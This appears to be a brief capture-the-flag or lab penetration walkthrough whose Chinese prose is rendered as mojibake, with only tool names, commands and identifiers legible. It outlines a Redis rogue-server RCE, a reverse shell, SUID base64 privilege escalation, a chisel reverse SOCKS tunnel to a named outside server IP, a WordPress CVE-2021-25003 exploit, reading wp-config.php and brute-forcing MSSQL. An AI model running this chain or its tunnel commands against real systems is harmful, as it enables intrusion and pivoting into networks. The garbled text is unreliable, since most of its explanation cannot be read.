еӨ–зҪ‘

е…Ҳз”Ёfscanжү«дёҖдёӢ

зңӢеҲ°жңүRedisзҡ„жңӘжҺҲжқғз”Ёжү“дёҖдёӢredisдё»д»ҺеӨҚеҲ¶rceжү“Redis Rogue Server

жӯЈеҗ‘shellйҖүжӢ©iеҸҚеҗ‘йҖүжӢ©rпјҢжүҖд»Ҙзӣ‘еҗ¬з«ҜеҸЈйҖүжӢ©r

зңӢзңӢsuidдҪҚжҳҜд»Җд№Ҳжғ…еҶө

еҸҜд»ҘдҪҝз”Ёbase64иҝӣиЎҢжҸҗжқғ

жҠҠfscanдј еҲ°йқ¶жңәдёҠйқўеҺ»жү«дёҖдёӢ

з„¶еҗҺдј еҘҪе°ұеҮҶеӨҮејҖе§Ӣжү«пјҢеҸ‘зҺ°еёёи§Ғзҡ„зҹҘйҒ“зҪ‘ж®өзҡ„е‘Ҫд»ӨйғҪжІЎдәҶпјҢеҗҺйқўзҹҘйҒ“еҺҹжқҘжҳҜзҺҜеўғеқҸдәҶпјҢжҸҗеҚҮдёҖдёӢдәӨдә’жҖ§йЎәдҫҝжү«

зңӢеҲ°mssqlе’ҢWordPressпјҢжҗӯе»әд»ЈзҗҶ

иҮӘе·ұжңҚеҠЎеҷЁдёҠйқўиҝҗиЎҢchisel server -p 5555 --reverseпјҢйқ¶жңәдёҠйқўиҝҗиЎҢ./chisel_1.7.6_linux_amd64 client 156.238.233.9:5555 R:0.0.0.0:1234:socksпјҢжөҸи§ҲеҷЁжҗһдёҠд»ЈзҗҶпјҢз«ҜеҸЈжҳҜ1234пјҢе°ұжү“WPзҡ„NDAYпјҢ

CVE-2021-25003 жү“ејҖkaliжҠҠд»ЈзҗҶжҗһеҘҪзӯүдјҡиҝҗиЎҢи„ҡжң¬

й…ҚеҘҪд»ЈзҗҶзӣҙжҺҘиҝһжҺҘ

зңӢеҲ°wp-config.php

иҝһжҺҘд№ӢеҗҺжӢҝеҲ°flag2е’ҢдёҖеј иЎЁпјҢжҠҠеҜҶз ҒеҜјеҮәпјҢз”ЁжқҘзҲҶз ҙmssql

з„¶еҗҺжІЎжү«еҮәжқҘпјҢеҸ‘зҺ°иҝҷдёӘеҜҶз ҒиЎЁйҮҢйқўе°ұжІЎжңүиҝҷдёӘеҜҶз ҒпјҢдҪҶжҳҜзҪ‘дёҠзҡ„з»“жһңйғҪжҳҜиҝҷж ·зҡ„

з„¶еҗҺMDUTиҝһжҺҘпјҢдҪҶжҳҜеҲ«еҝҳи®°й…ҚзҪ®д»ЈзҗҶ
